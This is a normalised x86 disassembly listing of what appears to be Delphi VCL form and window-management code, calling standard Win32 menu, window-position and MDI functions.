mov edx [ eax ]
call [ edx + 0x80 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
push 0xffffffff
mov eax edi
call sub_3ab7c38
push eax
call GetSystemMenu
push 0x0
xor ecx ecx
mov edx 0x81
mov eax edi
call sub_3ab0e78
cmp [ edi + 0x271 ] 0x3
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax edi
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov eax edi
call sub_3ac9c28
push eax
push 0x1
push 0x80
mov eax edi
call sub_3ab7c38
push eax
call SendMessageA
jmp r-xdata
sub_3ac7da4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0x94 ]
mov ecx esp
mov eax ebx
call sub_3aaf2e0
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0x94 ]
je r-xdata
mov eax ebx
call sub_3ab4518
sub_3ac7de8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x94 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_3aaf410
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
movzx eax [ ebx + 0x271 ]
mov [ ebx + 0x2c8 ] al
mov [ ebx + 0x271 ] 0x0
movzx eax [ ebx + 0x2c8 ]
mov [ ebx + 0x271 ] al
jmp r-xdata
sub_3ac7e40
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x29c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x29c ]
push eax
call __imp_SendMessageA
call sub_3aac5e0
sub_3ac7e74
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x277 ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x29c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_3acc958
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_3acc944
cmp [ eax + 0x277 ] 0x1
jne r-xdata
sub_3ac7ec0
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x277 ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x29c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_3acc958
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_3acc944
cmp [ eax + 0x277 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_3ac7f10
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_3a7a33c
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_3ac7f40
push ebx
push esi
push edi
push ebp
mov ebx eax
xor ebp ebp
push 0x2
mov eax ebx
call sub_3ab7c38
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ rw-data ]
call sub_3acc928
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_3acd878
mov eax [ rw-data ]
call sub_3acc928
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_3acc914
mov ebp eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_3acc914
mov ebp eax
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_3acc914
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_3acc914
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_3ac7ffc
push ebx
mov ebx eax
mov eax ebx
call sub_3ac7ff4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x288 ]
call sub_3a8fdc8
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_3ac8024
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x277 ]
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
cmp bl 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x3
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x277 ] bl
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
setne al
xor al 0x1
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
xor edx edx
push ebp
push sub_3ac818c
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ab9120
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac852c
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x3
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x277 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x277 ] bl
cmp bl 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d9 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ac8664
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3aafd28
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab472c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac6dc0
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ab9120
sub_3ac8198
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x277 ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x29c ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x290 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x2a0 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_3ab7c38
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x29c ]
push eax
call __imp_SendMessageA
test bl bl
je r-xdata
call sub_3aa3b48
mov edi eax
mov eax ebp
call sub_3ab7c38
push eax
call DrawMenuBar
sub_3ac8214
push ebx
mov ebx edx
mov [ eax + 0x2a8 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_3a83738
xor edx edx
mov eax ebx
call sub_3aa65c0
sub_3ac8238
push ebx
mov ebx eax
cmp edx [ ebx + 0x2a0 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2a0 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_3ac8198
mov eax edx
mov edx ebx
call sub_3a83738
sub_3ac8260
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3ac8474
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_3acc958
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_3aa83bc
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_3acc944
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_3a83738
mov [ ebx + 0x290 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_3acc944
cmp esi [ eax + 0x290 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x276 ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call SetMenu
mov eax [ ebx + 0x290 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x271 ] 0x3
je r-xdata
mov eax ebx
call sub_3ac8198
cmp [ ebx + 0x298 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
call sub_3ac9ab4
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac847b
lea eax [ ebp - 0x10 ]
call sub_3a652a0
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x277 ] 0x1
je r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebx + 0x290 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_3ab7c38
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowPos
push 0x0
xor ecx ecx
mov edx 0x85
mov eax ebx
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xf
mov eax ebx
call sub_3ab0e78
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_3ab7c38
mov edx eax
mov eax esi
call sub_3aa83bc
jmp r-xdata
mov eax [ ebx + 0x290 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_3ab7c38
push eax
call SetMenu
sub_3ac84ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_3ac8484
cmp ebx eax
je r-xdata
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
cmp ebx 0x24
jl r-xdata
mov eax [ esi + 0x2a4 ]
cmp [ eax ] 0x0
setne al
mov al 0x1
jmp r-xdata
mov eax [ esi + 0x2a4 ]
mov [ eax ] ebx
test al al
je r-xdata
sub_3ac8548
push ebx
mov ebx eax
cmp dl [ ebx + 0x330 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x330 ] dl
cmp dl 0x1
jne r-xdata
xor eax eax
mov [ ebx + 0x340 ] eax
xor eax eax
mov [ ebx + 0x344 ] eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
cmp [ ebx + 0x334 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_3ac859c
mov eax ebx
call sub_3ab4518
sub_3ac859c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x334 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x334 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_3a83978
xor eax eax
mov [ ebx + 0x340 ] eax
xor eax eax
mov [ ebx + 0x344 ] eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_3a83738
mov [ ebx + 0x330 ] 0x2
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_3ab4518
sub_3ac860c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_3ac85fc
cmp bl al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x2a4 ]
xor edx edx
mov [ eax ] edx
test bl bl
je r-xdata
mov eax [ esi + 0x2a4 ]
mov edx [ rw-data ]
mov edx [ edx + 0x40 ]
mov [ eax ] edx
sub_3ac867c
push ebx
mov ebx eax
mov eax ebx
call sub_3ab7220
cmp [ ebx + 0x1d9 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_3ac8664
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_3ac8664
mov edx eax
mov eax ebx
call sub_3aafd28
mov edx 0xff00000f
mov eax ebx
call sub_3aafd28
pop ebx
retn
sub_3ac8700
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x273 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x273 ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1da ] 0x0
je r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_3ab7c38
push eax
call ShowWindow
sub_3ac8740
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx + 0x279 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
movzx eax [ ebx + 0x279 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3ac7f40
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_3ac7f40
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_3acc928
dec eax
test eax eax
jl r-xdata
mov eax [ rw-data ]
call sub_3acd89c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_3ac7f40
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_3acc928
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
movzx eax [ ebx + 0x278 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_3acc914
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5f4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5d8
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5c0
mov ebp eax
mov eax ebx
call sub_3ac6950
add ebp eax
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5c0
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5c0
push eax
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc60c
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5f4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5d8
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5c0
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc60c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5f4
push eax
mov eax ebx
call sub_3ac6970
pop edx
add edx eax
push edx
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5f4
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5f4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5d8
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5c0
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc60c
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5c0
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc60c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x88 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x88 ]
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5f4
push eax
mov edx esi
mov eax [ rw-data ]
call sub_3acc914
call sub_3acc5d8
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x88 ]
jmp r-xdata
adc eax 0x0
sub_3ac8aa4
push ebx
push esi
mov esi eax
push esi
call GetParent
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
and eax 0x80
cmp eax 0x80
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov ebx [ eax + 0x44 ]
test ebx ebx
je r-xdata
push esi
call GetParent
mov ebx eax
mov eax [ rw-data ]
mov ebx [ eax + 0x30 ]
push 0xffffffec
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowLongA
test al 0x80
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3ab7c38
mov ebx eax
jmp r-xdata
sub_3ac8b14
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_3ac5320
mov edx edi
mov eax ebx
call sub_3acc0d8
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov [ edi + 0x24 ] 0x8
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x1c4 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
xor esi esi
test [ ebx + 0x1c ] 0x10
je r-xdata
movzx eax [ ebx + 0x278 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
or [ edi + 0x4 ] 0xcf0000
jmp r-xdata
test [ ebx + 0x358 ] 0x8
je r-xdata
mov al 0x2
jmp r-xdata
lea eax [ edi + 0x24 ]
push eax
lea ecx [ edi + 0x8 ]
lea edx [ edi + 0x4 ]
mov eax ebx
mov si 0xffa9
call sub_3a6457c
movzx eax [ ebx + 0x271 ]
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov [ edi + 0xc ] 0x80000000
mov [ edi + 0x10 ] 0x80000000
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x277 ] 0x0
jne r-xdata
cmp [ ebx + 0x330 ] 0x0
jne r-xdata
mov ebp [ ebx + 0x340 ]
test ebp ebp
jne r-xdata
mov edx eax
sub dl 0x2
je r-xdata
mov edx eax
test dl dl
je r-xdata
xor eax eax
movzx eax [ ebx + 0x330 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebx + 0x344 ]
test eax eax
je r-xdata
cmp [ ebx + 0x344 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
sub dl 0x3
jne r-xdata
mov al 0x2
sub dl 0x3
jne r-xdata
mov esi ebp
mov eax ebp
call sub_3ab7c38
mov [ edi + 0x1c ] eax
mov [ edi + 0x1c ] eax
jmp r-xdata
sub al 0x1
jb r-xdata
movzx edx [ ebx + 0x278 ]
sub dl 0x1
je r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
sub al 0x3
jae r-xdata
mov eax [ edi + 0x1c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
je r-xdata
mov eax esi
call sub_3ac849c
mov edx ebx
call sub_3a7a4f0
test eax eax
jge r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
call sub_3ad1240
test al al
je r-xdata
je r-xdata
mov [ edi + 0x14 ] 0x80000000
mov [ edi + 0x18 ] 0x80000000
sub dl 0x2
jne r-xdata
mov [ ebx + 0x273 ] 0x0
test [ ebx + 0x1c ] 0x10
jne r-xdata
and [ edi + 0x4 ] 0xbffcffff
mov [ ebx + 0x344 ] eax
mov edx esi
mov eax ebx
call sub_3a83738
mov [ ebx + 0x340 ] esi
jmp r-xdata
mov eax esi
call sub_3ac849c
mov edx ebx
call sub_3a7a33c
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
movzx eax [ ebx + 0x54 ]
and ax 0x8000
cmp ax 0x8000
jne r-xdata
mov eax [ rw-data ]
call sub_3ad0b18
mov [ edi + 0x1c ] eax
cmp [ edi + 0x1c ] 0x0
je r-xdata
dec al
je r-xdata
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff3fffff
test [ ebx + 0x1d ] 0x2
je r-xdata
movzx eax [ ebx + 0x273 ]
cmp al 0x1
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
sete al
mov al 0x1
jmp r-xdata
mov ebp [ edi + 0x1c ]
test ebp ebp
je r-xdata
mov eax [ edi + 0x1c ]
call sub_3ac4004
test eax eax
jne r-xdata
mov ebp [ ebx + 0x334 ]
test ebp ebp
je r-xdata
jmp r-xdata
lea ecx [ edi + 0x8 ]
lea edx [ edi + 0x4 ]
mov eax ebx
mov si 0xffaa
call sub_3a6457c
mov eax [ rw-data ]
call sub_3ad1240
test al al
je r-xdata
mov eax DefMDIChildProcA
mov [ edi + 0x28 ] eax
cmp al 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_3ad1240
test al al
je r-xdata
mov eax [ rw-data ]
mov ebp [ eax + 0x44 ]
test ebp ebp
je r-xdata
xor eax eax
mov [ edi + 0x1c ] eax
jmp r-xdata
test al al
je r-xdata
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push 0xffffffec
push ebp
call GetWindowLongA
and eax 0x80
cmp eax 0x80
jne r-xdata
xor eax eax
mov [ edi + 0x1c ] eax
mov eax [ edi + 0x1c ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_3ad0b60
mov [ edi + 0x1c ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
movzx eax [ ebx + 0x54 ]
and ax 0x8000
cmp ax 0x8000
jne r-xdata
or [ edi + 0x4 ] 0x1000000
jmp r-xdata
xor eax eax
movzx eax [ ebx + 0x54 ]
and ax 0x8000
cmp ax 0x8000
sete al
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax ebp
call sub_3ab7fd8
test al al
je r-xdata
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov eax [ edi + 0x1c ]
call sub_3ac8aa4
mov [ edi + 0x1c ] eax
mov eax [ edi + 0x1c ]
push eax
call IsWindowEnabled
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
mov eax ebp
call sub_3ab7c38
mov [ edi + 0x1c ] eax
mov esi [ ebx + 0x334 ]
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov al 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x20000000
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
test al al
je r-xdata
mov eax [ rw-data ]
call sub_3ad0b60
mov ebp eax
mov [ edi + 0x1c ] ebp
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3ab7c38
cmp ebp eax
jne r-xdata
mov eax [ rw-data ]
call sub_3ad1240
test al al
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp eax [ edx + 0x1b4 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x44 ]
cmp eax [ edx + 0x1b4 ]
jne r-xdata
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
cmp [ ebx + 0x277 ] 0x1
je r-xdata
test [ ebx + 0x55 ] 0x20
je r-xdata
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3ac849c
mov edx ebx
call sub_3a7a4f0
test eax eax
jge r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
movzx eax [ ebx + 0x54 ]
and ax 0x8000
cmp ax 0x8000
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x6c ]
jmp r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
je r-xdata
or [ edi + 0x8 ] 0x40000
mov eax [ rw-data ]
mov edx [ eax + 0x44 ]
mov eax ebx
call sub_3a83738
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3ac849c
mov edx ebx
call sub_3a7a33c
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
sete al
mov al 0x1
jmp r-xdata
mov al 0x1
mov eax [ rw-data ]
mov ebp [ eax + 0x44 ]
test ebp ebp
je r-xdata
xor eax eax
mov [ edi + 0x1c ] eax
jmp r-xdata
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
mov eax ebp
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ rw-data ]
call sub_3ad0b60
mov ebp eax
mov [ edi + 0x1c ] ebp
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3ab7c38
cmp ebp eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3ac849c
mov edx ebx
call sub_3a7a4f0
test eax eax
jge r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x44 ]
mov eax ebx
call sub_3a83738
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_3ac849c
